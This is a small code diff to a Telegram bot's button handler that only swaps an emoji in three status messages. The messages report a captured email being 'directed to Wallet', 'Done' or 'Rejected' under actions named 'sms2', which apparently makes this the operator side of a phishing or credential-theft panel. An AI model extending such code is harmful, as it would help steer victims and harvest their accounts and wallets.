@@ -116,11 +116,11 @@ bot.on("callback_query", async (query) => {
           
           let statusMsg = "";
           if (action === "sms2_wallet") {
-            statusMsg = `🔐 <code>${sms2Email}</code> has been directed to <b>Wallet</b> 💼`;
+            statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Wallet</b> 💼`;
           } else if (action === "sms2_done") {
-            statusMsg = `🔐 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
+            statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
           } else if (action === "sms2_reject") {
-            statusMsg = `🔐 <code>${sms2Email}</code> has been <b>Rejected</b> ❌`;
+            statusMsg = `📧 <code>${sms2Email}</code> has been <b>Rejected</b> ❌`;
           }
           
           if (statusMsg) {
